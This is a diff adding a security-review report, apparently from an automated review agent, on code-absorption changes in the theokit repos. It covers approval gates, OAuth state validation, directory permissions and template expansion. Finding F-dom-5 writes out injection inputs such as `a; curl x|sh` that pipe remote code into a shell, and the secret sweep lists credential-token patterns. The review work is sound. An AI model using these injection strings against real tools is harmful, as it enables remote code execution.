@@ -1,0 +1,419 @@
+agent: review-crossval-4-6-absorption-domain-security
+review_target: origin/develop..HEAD for plan crossval-4-6-absorption (theokit +61, theokit-sdk +7, theokit-tui +6)
+domain: security
+domain_specific_patterns_checked:
+  - 'single-pass template expansion — substituted content is INERT (plan EC-4, command-template.ts:18-27)'
+  - 'expander never spawns / never opens a file — shell+readFile injected (plan T3.3, G10 honest-enforcement)'
+  - 'ReDoS on the reference pattern (test asserts the nested-quantifier rewrite, command-template.test.ts:171-184)'
+  - 'fail-closed approval: absence of evidence is never evidence of confinement (B-006 / B-021 scars, ADR D5)'
+  - 'full-auto requires posture.enforced === true (approval-posture.ts M77 runtime refusal)'
+  - "auto-edit bounded by the tool's own write scope"
+  - '0700 dirs / 0600 files under the shared ~/.theokit root; repair scoped to the leaf (plan Q3 proposal + its 2026-08-16 correction)'
+  - 'assertSecureModes as the claimed compensating control for pre-existing loose dirs (SDK credential-store.ts:122)'
+  - 'public-surface transitive closure of the new @theokit/sdk/mcp-auth subpath; _resetForTests exclusion (T1.3)'
+  - '.d.mts declarations must not over-promise their .mjs implementation (scripts/lib/*)'
+  - 'no secret/token/credential in tracked files, commit messages or changesets across the 74 commits'
+
+findings:
+  - id: F-dom-1
+    severity: HIGH
+    file: packages/agents/src/bridge/approval-decision.ts
+    line: 52
+    plan_ref: "ADR D5 — absorb the consumer's scar tissue, not its interface; T2.1 / T5.1 (RETARGETED approval-mode.test.ts)"
+    domain_anchor: 'Baseline Context invariant for packages/tui/src/consent/approval-mode.ts — "auto-edit stays bounded by the tool''s write scope"; rules/error-handling.md § 2 (fail-closed)'
+    summary: >-
+      The absorbed default write-scoped set is THREE tools where the only real consumer's set is ONE.
+      Adopting the framework symbol silently widens an approval gate: `edit_file` (which TheoCode
+      actually registers) stops requiring a human in `auto-edit` mode, with no sandbox posture
+      required at all.
+    evidence: |
+      Framework (new):
+      ```ts
+      // packages/agents/src/bridge/approval-decision.ts:52-56
+      export const WRITE_SCOPED_TOOLS: ReadonlySet<string> = new Set([
+        'apply_patch', 'edit_file', 'write_file',
+      ])
+      ```
+      Consumer being replaced (TheoCode/packages/tui/src/consent/approval-mode.ts:5):
+      ```ts
+      const EDIT_TOOLS = new Set(['apply_patch'])
+      ```
+      The consumer DOES register the extra name — TheoCode/packages/agent/src/tools/registry.ts:90-91:
+      ```ts
+      ['edit_file', withName(bound.bind(createEditFileTool)({ projectRoot: scope.writeRoot }), 'edit_file')],
+      ```
+      And the widening is asserted as intended behaviour, with no posture argument:
+      ```ts
+      // packages/agents/tests/unit/approval-decision.test.ts:67-70
+      expect(shouldAutoApprove('auto-edit', 'edit_file')).toBe(true)
+      expect(shouldAutoApprove('auto-edit', 'write_file')).toBe(true)
+      ```
+      The `writeScopedTools` escape hatch exists (:59-61) but nothing in the plan, the tests, or the
+      new gates requires T5.1's adoption to use it. Grep of the diff for a CHANGELOG note naming the
+      widening returned nothing.
+    recommended_action: >-
+      Either (a) ship the default as `new Set(['apply_patch'])` — the measured consumer semantics —
+      and let a product widen it explicitly, or (b) make T5.1's adoption pass
+      `{ writeScopedTools: new Set(['apply_patch']) }` AND add a regression test in TheoCode pinning
+      that `edit_file` still prompts. Whichever is chosen, record the delta in
+      packages/agents/CHANGELOG.md under `Security`/`Changed` — a widened approval gate is a
+      consumer-visible change, not an implementation detail.
+
+  - id: F-dom-2
+    severity: HIGH
+    file: ../theokit-sdk/packages/sdk/src/internal/mcp/token-storage.ts
+    line: 77
+    plan_ref: "T1.3 (publish the MCP OAuth subpath) + T2.4 / Q3 proposal — 'route the remaining creators through ensureSecureDir'"
+    domain_anchor: "SDK credential-store.ts:118-121 — 'a writable dir lets an attacker replace the credential file with a symlink to their own 0600 file'"
+    summary: >-
+      T2.4 hardened three creators under ~/.theokit and missed the one that stores OAuth refresh
+      tokens — and T1.3 then published exactly that path as `@theokit/sdk/mcp-auth`. The token file
+      is 0600 but its parent `~/.theokit` is created with no mode, so under `umask 002` it is born
+      0775 and another local user can unlink-and-replace `mcp-tokens.json` wholesale.
+    evidence: |
+      ```ts
+      // token-storage.ts:22
+      const FILE_PATH = join(homedir(), ".theokit", "mcp-tokens.json");
+      // token-storage.ts:66-79
+      // File fallback. atomicWriteJson auto-creates the parent directory.
+      await atomicWriteJson(FILE_PATH, allTokens);
+      try { chmodSync(FILE_PATH, 0o600); } catch { /* windows */ }
+      ```
+      ```ts
+      // internal/persistence/atomic-write.ts:247  — NO mode, unlike jsonl.ts:142 which T2.4 fixed
+      await mkdir(dirname(filePath), { recursive: true });
+      ```
+      Two further gaps on the same, now-public, path:
+        * `getTokens` (token-storage.ts:90-108) reads the token bundle with **no** mode check —
+          `assertSecureModes` is called only from `readAuthFile` (credential-store.ts:193) over
+          `credentialHome`, never here.
+        * `chmodSync` runs AFTER the write, so the file exists at the umask mode for a window; the
+          same directory is `credentialHome`'s parent, so a run order that puts MCP first creates
+          the very shape `assertSecureModes` later throws on — the self-inconsistency Q3 set out to
+          close, still live in the newly published entry point.
+    recommended_action: >-
+      Give `atomicWriteJson`/`atomicWriteText` an optional `dirMode` and have `setTokens` pass
+      `0o700` (or route `setTokens` through the same `ensureSecureDir` shape used in
+      packages/agents/src/hooks/secure-store.ts:54). Add an `assertSecureModes(dirname(FILE_PATH),
+      FILE_PATH)` on the read path in `getTokens`, mirroring `readAuthFile`. Both before the
+      `@theokit/sdk` publish that carries the `./mcp-auth` subpath.
+
+  - id: F-dom-3
+    severity: MEDIUM
+    file: ../theokit-sdk/packages/sdk/src/internal/persistence/jsonl.ts
+    line: 141
+    plan_ref: "T2.4 — 'the transcript root was born writable by other users'"
+    domain_anchor: "SDK credential-store.ts:122 assertSecureModes; framework config/trust-store.ts:157-161 ('the mode argument is a NO-OP on a directory that already exists')"
+    summary: >-
+      The creation-time-only `mode: 0o700` is defensible on the append hot path, but the comment
+      names a compensating control that does not cover this directory: `assertSecureModes` is only
+      ever called on the credential home, never on a transcript project directory. A tree left loose
+      by an older SDK is therefore neither repaired nor detected on this path.
+    evidence: |
+      ```ts
+      // jsonl.ts:139-142
+      // Creation-time only, deliberately: repairing a pre-existing directory means `stat` + `chmod` on
+      // every append, and this is the hot path of every session. The pre-existing case is what
+      // `assertSecureModes` is for.
+      mkdirSync(dirname(path), { recursive: true, mode: 0o700 });
+      ```
+      Measured callers of the claimed control (`grep -rn assertSecureModes packages/ --include=*.ts`,
+      non-test): exactly one — `credential-store.ts:193`, over `credentialHome(config, env)`.
+      No caller passes a transcript path.
+    recommended_action: >-
+      Do the repair ONCE per process, not per append: a module-level `Set<string>` of already-checked
+      directories keyed on `dirname(path)`, doing `stat` + `chmod` on first sight only. That keeps the
+      hot path at zero extra syscalls after the first write and closes the pre-existing case for real.
+      If that is declined, delete the sentence citing `assertSecureModes` and state honestly that a
+      pre-existing loose transcript directory is unchecked.
+
+  - id: F-dom-4
+    severity: MEDIUM
+    file: packages/agents/src/hooks/secure-store.ts
+    line: 54
+    plan_ref: "T2.4 + the plan's 2026-08-16 Q3 correction ('routed through ensureSecureDir')"
+    domain_anchor: "rules/error-handling.md § 2 (fail-fast, fail-loud); plan Q3 — 'the check is right and the layout disagrees with itself'"
+    summary: >-
+      VERIFIED SAFE as asked — the repair is strictly leaf-scoped and never chmods toward $HOME. The
+      residual is that nothing detects a loose ANCESTOR under the transcript root, and a
+      group-writable `~/.theokit/projects` defeats the 0700 leaf entirely: another local user can
+      rename the project directory away and substitute their own.
+    evidence: |
+      ```ts
+      // secure-store.ts:54-73 — dirname(filePath) only; chmodSync(dir, …) never walks up.
+      export function ensureSecureDir(filePath: string): void {
+        const dir = dirname(filePath)
+        mkdirSync(dir, { recursive: true, mode: DIR_MODE })
+        const mode = statSync(dir).mode & 0o777
+        if ((mode & FORBIDDEN_WRITE_BITS) !== 0) { chmodSync(dir, DIR_MODE); … }
+      }
+      ```
+      Callers pass a FILE path, so `dir` is the leaf:
+      `project-index.ts:75 ensureSecureDir(sidecar)` → `~/.theokit/projects/<hash>/`
+      `session-pointer.ts:94 ensureSecureDir(target)` → same leaf.
+      Neither `~/.theokit` nor `~/.theokit/projects` is ever inspected on this path.
+    recommended_action: >-
+      Keep chmod at the leaf (correct). Add a non-mutating ASSERTION over the ancestors between
+      `transcriptRoot()` and the leaf, returning the same typed refusal shape `readSecureJson` uses,
+      so a loose ancestor is surfaced to the operator with the `chmod 700` fix instead of being
+      silently tolerated.
+
+  - id: F-dom-5
+    severity: MEDIUM
+    file: packages/agents/src/config/command-template.ts
+    line: 120
+    plan_ref: 'EC-4 — single-pass expansion so an inlined file cannot inject a shell segment; T3.3'
+    domain_anchor: "command-template.ts:24-27 — 'Arguments ARE substituted first, deliberately … That is the one re-scan that is safe'"
+    summary: >-
+      The single-pass inertness claim is VERIFIED for shell output and file content (see the
+      verifications section). It does NOT hold for arguments, and the justification for that
+      exception is an assumption about the caller that the module cannot enforce, does not test, and
+      offers no way to opt out of. An argument can both introduce a shell segment the template never
+      contained and land unquoted inside one it did.
+    evidence: |
+      Order is fixed at :120-133 — `PLACEHOLDER_REGEX` pass, then the single `REFERENCE_REGEX` pass
+      over the ALREADY-SUBSTITUTED string:
+      ```ts
+      const withArgs = await replaceAsync(template, PLACEHOLDER_REGEX, …)
+      // ONE scan for both, so neither's result is visible to the other's pattern.
+      return replaceAsync(withArgs, REFERENCE_REGEX, async (match) => { … deps.shell(command) … })
+      ```
+      Consequences, neither of which has a test:
+        1. template `Summarize $1`, rawArgs ``!`curl x|sh` `` → a shell segment exists where the
+           template author wrote none.
+        2. template ``!`git diff $1` ``, rawArgs `"a; curl x|sh"` → `splitArgs` keeps the quoted run
+           as ONE argument and `QUOTE_TRIM_REGEX` (:39, :64) strips the quotes, so `deps.shell`
+           receives `git diff a; curl x|sh`. No quoting or escaping is applied at substitution.
+      The only test of this direction (`test_arguments_reach_inside_a_shell_segment`, :188-196)
+      asserts the happy path and stops.
+    recommended_action: >-
+      State the trust level in `TemplateDeps`/the module docblock explicitly — "rawArgs is trusted at
+      the same level as the command body; a caller that sources arguments from model output, clipboard
+      paste or a remote payload must sanitise before calling" — and add the two negative tests above
+      so the blast radius is pinned rather than assumed. Optionally add
+      `ShouldExpandOptions { argumentsAreInert?: boolean }` that neutralises `` ` `` / `!` / leading
+      `@` in substituted argument values, for callers that cannot make that promise.
+
+  - id: F-dom-6
+    severity: MEDIUM
+    file: ../theokit-sdk/packages/sdk/src/internal/mcp/oauth.ts
+    line: 277
+    plan_ref: "T1.3 — 'the MCP OAuth flow gets a way in'; capability index row added by 87a4d9f4 ('the row that sent people to hand-write PKCE')"
+    domain_anchor: "oauth.ts:127-133 — 'EC-2 MUST FIX: validate state' / CSRF protection on the PKCE flow"
+    summary: >-
+      In manual (`oob`) redirect mode the stdin reader FABRICATES the expected state when the user
+      pastes a bare code, so the CSRF check at :128 compares `expectedState` against itself and can
+      never fail. Pre-existing internal code — but T1.3 published it and the capability index now
+      directs customers here instead of hand-writing RFC 7636, which changes who is relying on it.
+    evidence: |
+      ```ts
+      // oauth.ts:274-277
+      // Treat the entire input as the code. State validation will fail
+      // unless the user also provided state — but in manual mode they
+      // typically paste the URL with state baked in.
+      resolve({ code: trimmed, state: expectedState });
+      ```
+      Consumed at :126-133:
+      ```ts
+      const { code, state: returnedState } = await codeWaiter;
+      if (returnedState !== state) { throw … "possible CSRF attempt" }
+      ```
+      The comment's own prediction ("state validation will fail") is contradicted by the line it
+      annotates. Localhost mode (:207-211) validates correctly — the defect is manual mode only.
+    recommended_action: >-
+      Resolve `{ code: trimmed, state: '' }` on the bare-code path and let the existing check refuse,
+      with an error message telling the user to paste the FULL callback URL. If a bare code must stay
+      supported, require an explicit `oauth.allowUnvalidatedState === true` opt-in so the weakening is
+      named rather than defaulted. Add a test asserting a bare code is refused.
+
+  - id: F-dom-7
+    severity: MEDIUM
+    file: packages/agents/src/bridge/approval-decision.ts
+    line: 17
+    plan_ref: "T2.1 — 'the invariant, stated once'"
+    domain_anchor: 'rules/testing.md § 4.1 (negative cases assert the specific behaviour, not a convenient one)'
+    summary: >-
+      The module's headline invariant is false for one of its three modes, and the test that claims
+      to prove it is constructed with the one tool name that hides the exception. A security module
+      whose stated rule and whose code disagree is how the next reader draws the wrong conclusion.
+    evidence: |
+      Stated (approval-decision.ts:17-19):
+      ```
+      ## The invariant, stated once
+      **Nothing auto-approves without positive evidence of enforced confinement.**
+      ```
+      Actual (:85) — `auto-edit` consults no posture at all:
+      ```ts
+      case 'auto-edit':
+        return (options?.writeScopedTools ?? WRITE_SCOPED_TOOLS).has(toolName)
+      ```
+      `shouldAutoApprove('auto-edit', 'apply_patch')` with NO posture returns `true`.
+      The proof (approval-decision.test.ts:41-49) loops all three modes but passes `'run_shell'`,
+      which is the single input for which the blanket claim happens to hold:
+      ```ts
+      for (const mode of APPROVAL_MODES) {
+        expect(shouldAutoApprove(mode, 'run_shell'), …).toBe(false)
+      }
+      ```
+    recommended_action: >-
+      Restate the invariant as the two rules that are actually true ("no COMMAND runs without enforced
+      confinement; a WRITE runs only when the user chose auto-edit and the tool carries its own write
+      root") and rename/extend the test so the auto-edit exception is asserted in the same block that
+      claims the invariant — e.g. add `expect(shouldAutoApprove('auto-edit','apply_patch')).toBe(true)`
+      with the reason inline.
+
+  - id: F-dom-8
+    severity: LOW
+    file: packages/agents/src/bridge/approval-decision.ts
+    line: 79
+    plan_ref: 'T2.1 — the callable predicate as published surface (bridge/index.ts:82)'
+    domain_anchor: "rules/error-handling.md § 2 — 'return explicit errors, not magic values'; § 5 anti-pattern list"
+    summary: >-
+      The exhaustive switch has no runtime default. A JS consumer, or a `mode` read from user config
+      without `parseApprovalMode`, falls off the end and receives `undefined` from a function whose
+      declared return type is `boolean`.
+    evidence: |
+      ```ts
+      export function shouldAutoApprove(mode: ApprovalMode, …): boolean {
+        switch (mode) {
+          case 'suggest':   return false
+          case 'auto-edit': return …
+          case 'full-auto': return posture?.enforced === true
+        }        // <- no default; `shouldAutoApprove('yolo' as any, 'run_shell')` === undefined
+      }
+      ```
+      Fail-closed under `if (…)`, but not under `=== false`, `!== true` inversions, or a JSON round
+      trip. The symbol is published (`packages/agents/src/bridge/index.ts:82`), so untyped callers are
+      a real population.
+    recommended_action: >-
+      Add `default: return false` with a one-line comment (an unknown mode is not a mode we can
+      auto-approve under), or throw a typed `ConfigurationError`. Add a negative test passing an
+      out-of-union string.
+
+  - id: F-dom-9
+    severity: LOW
+    file: ../theokit-tui/.npmrc
+    line: 1
+    plan_ref: "Risk R1 — 'a stale npm _authToken (E401)'; T5.0 publish checkpoint across four repos"
+    domain_anchor: "Secret-hygiene sweep requested for this review; sibling repos' own posture (theokit/.gitignore:66,69; theokit-sdk/.gitignore:104)"
+    summary: >-
+      No secret was committed (see verifications). But `theokit-tui` is the one repo of the three
+      where `.npmrc` is TRACKED and `.gitignore` contains no `npmrc` entry — so a project-scoped
+      `npm login` during the publish train writes `//registry.npmjs.org/:_authToken=` into a file git
+      is already following.
+    evidence: |
+      ```
+      $ cd ../theokit-tui && git ls-files | grep npmrc
+      .npmrc
+      $ grep -nE "npmrc|env" .gitignore   # exit 1 — no match, 14 lines total
+      ```
+      Contrast: `theokit/.gitignore:66` `.npmrc`, `:69` `.npmrc*`; `theokit-sdk/.gitignore:104`
+      `.npmrc`. Current content verified benign (`auto-install-peers=false` plus a comment) and the
+      full history of the file (`git log -p -- .npmrc`) contains no `_authToken`/`_auth`/`_password`.
+    recommended_action: >-
+      Rename the tracked file to `.npmrc.project` + `npmrc` config, or keep it tracked and add a
+      pre-commit guard that refuses any `.npmrc` diff containing `_authToken`/`_auth=`/`_password`.
+      At minimum add `.env`/`.env.*` to `theokit-tui/.gitignore`, which is also absent.
+
+  - id: F-dom-10
+    severity: LOW
+    file: packages/agents/src/session/gc/registry-remover.ts
+    line: 62
+    plan_ref: "T2.2 + commit 96c9634d 'a registry that never answered hung the entire GC sweep'"
+    domain_anchor: "rules/error-handling.md § 3 step 6 — 'RECOVER where it makes sense: retry / fallback / circuit breaker'"
+    summary: >-
+      The bound that the hang-fix commit exists to provide is opt-in and neither call site supplies a
+      default, so the unattended-sweep hang remains the shipped default for any consumer that does
+      not discover `registryTimeoutMs`. Availability rather than a trust boundary, hence LOW.
+    evidence: |
+      ```ts
+      // registry-remover.ts:62
+      if (!isThenable(outcome) || timeoutMs === undefined) return outcome   // unbounded await
+      ```
+      ```ts
+      // transcript-gc.ts:291-295 and session-lifecycle.ts:255-259 — both pass it through unchanged
+      await awaitRegistryRemoval(options.removeFromRegistry(candidate.id), candidate.id, options.registryTimeoutMs)
+      ```
+      `registryTimeoutMs?: number` is declared optional at transcript-gc.ts:262 and
+      session-lifecycle.ts:207 with no default anywhere.
+    recommended_action: >-
+      Default `registryTimeoutMs` in the SWEEP path (`runTranscriptGC`) to a finite value — 30_000 is
+      generous for `Agent.delete` — keeping `undefined` meaningful only where a caller explicitly opts
+      out. The single-session path may keep the opt-in shape; the unattended one is the one that
+      cannot be interrupted by a human.
+
+verified_no_finding:
+  - check: 'single-pass inertness — shell output and file content are never re-scanned'
+    result: PASS
+    evidence: >-
+      `replaceAsync` (command-template.ts:83-99) materialises `[...source.matchAll(pattern)]` against
+      the ORIGINAL string before any replacement is produced, then stitches by slice/cursor. A
+      replacement is structurally unreachable by the pattern. Both directions are pinned by tests
+      (command-template.test.ts:106-115 shell output, :119-130 file content). `matchAll` constructs a
+      fresh regex per call, so the module-level `/g` `lastIndex` cannot leak between invocations.
+  - check: 'ReDoS on REFERENCE_REGEX'
+    result: PASS
+    evidence: >-
+      `/!`(?<cmd>[^`]+)`|(?<!\S)@(?<file>[^\s`,]*[^\s`,.])/g`. The `X* X` tail backtracks at most
+      once per character and the `(?<!\S)` lookbehind restricts start positions to whitespace-preceded
+      `@`. Measured on node: `@` + 60 000 dots = 0.15 ms; 2 000 references = 1.7 ms; unterminated
+      `` !` `` + 100 000 chars = 0.14 ms. Linear. The nested-quantifier ancestor
+      (`\.?[^\s`,.]*(?:\.[^\s`,.]+)*`, still live in TheoCode's copy) is genuinely gone.
+  - check: 'the expander never spawns and never opens a file'
+    result: PASS
+    evidence: >-
+      Only `deps.shell` / `deps.readFile` are called (command-template.ts:136, :145). No
+      `node:child_process` or `node:fs` import in the module. The file name is handed over verbatim —
+      no join/normalise/realpath — pinned at command-template.test.ts:161-184, which is the correct
+      call: a second containment check that disagrees with the first is worse than none.
+  - check: 'an absent posture never auto-approves'
+    result: PASS
+    evidence: >-
+      `full-auto` requires `posture?.enforced === true` (approval-decision.ts:88) — optional chaining
+      makes `undefined` and `{enforced:false}` both false. `suggest` is unconditionally false.
+      `applyPosture` (approval-posture.ts:177) routes its runtime refusal through the same predicate,
+      so the M77 fail-closed throw and the per-event predicate cannot drift. Caveat recorded as
+      F-dom-7 for the `auto-edit` branch.
+  - check: 'ensureSecureDir does not chmod toward $HOME'
+    result: PASS
+    evidence: >-
+      `dirname(filePath)` is computed once and every `statSync`/`chmodSync` targets that single `dir`
+      (secure-store.ts:55-73). There is no loop and no parent walk. Residual ancestor risk recorded
+      separately as F-dom-4.
+  - check: '@theokit/sdk/mcp-auth transitive closure and _resetForTests exclusion'
+    result: PASS
+    evidence: >-
+      `src/mcp-auth.ts` re-exports exactly six names (`refreshAccessToken`, `runPkceFlow`,
+      `getTokens`, `lockedRefresh`, `setTokens`, type `OAuthTokens`). `_resetForTests`
+      (token-storage.ts:139) is not among them and is asserted absent from the built entry at
+      `packages/sdk/tests/mcp-auth-subpath.test.ts:107-109`. The only other module reached is
+      `errors.js`, already public. No `stripInternal` is configured, so the `@internal` JSDoc on the
+      re-exported symbols does not silently erase their declarations.
+  - check: '.d.mts declarations match their .mjs implementations'
+    result: PASS
+    evidence: >-
+      Four pairs read side by side. `declared-exports.d.mts` ↔ `.mjs:62` — same arity, same
+      `{names, unresolvedForwards}` return, and the comment correctly records that `typeCandidates`
+      is deliberately unexported. `invention-reachability.d.mts` ↔ `.mjs:55` — `InventionFinding`
+      fields match the object literal at `.mjs:102-108` exactly, including `allowlistExpired`.
+      `changelog-closes.d.mts` ↔ `.mjs:34` — `MissingClose` matches `.mjs:55`, and the declared
+      "reads [Unreleased] only" is enforced at `.mjs:20-26`. `boundary-decisions.d.mts` ↔ `.mjs:35` —
+      `'forward' | { out: string }` is the literal shape used. No declaration promises a symbol,
+      field or narrowing the implementation does not deliver.
+  - check: 'no secret, token or credential in the 74 commits across the three repos'
+    result: PASS
+    evidence: >-
+      Pattern sweep over `git diff origin/develop..HEAD` and over every commit message in all three
+      repos for `npm_*`, `_authToken`, `//registry.npmjs.org/:_auth`, `NPM_TOKEN=`, `sk-*`, `ghp_*`,
+      `github_pat_`, `AKIA*`, PEM private-key headers, and for assigned `password|secret|api_key|token`
+      literals: ZERO hits outside prose. The two `_authToken` occurrences are the plan's own Risk-R1
+      narrative describing a STALE token's `E401` — the word, never a value. No `.npmrc`, `.env`,
+      `.pem` or `.key` is tracked in `theokit` or `theokit-sdk`; the `.env.example` files carry no
+      values. `theokit-tui/.npmrc` is tracked and verified token-free across its whole history
+      (hygiene risk recorded as F-dom-9).
+
+honest_limitations:
+  - "F-dom-1's impact depends on which tool names TheoCode's registry exposes at adoption time; measured against TheoCode HEAD on branch workspace (registry.ts:41-42, 88-91). If the registry changes before T5.1 lands, re-measure."
+  - 'F-dom-2/F-dom-3/F-dom-4 assume a multi-user POSIX host. On a single-user laptop the group/world-write exposure is theoretical; the plan itself treats `umask 002` as the real-machine case, which is why they are not downgraded.'
+  - "F-dom-5's severity turns on whether any surface builds `rawArgs` from non-human input. I could not find such a call site in-repo (`expandCommandTemplate` has zero production callers here — only config-entry.ts:78 re-exports it), so the finding is about an unenforced contract on a published API, not a demonstrated exploit."
+  - 'Regex analysis is manual plus empirical timing, not a formal ReDoS proof. The measured curve is linear over four input sizes; a pathological input outside the shapes tried cannot be ruled out formally.'
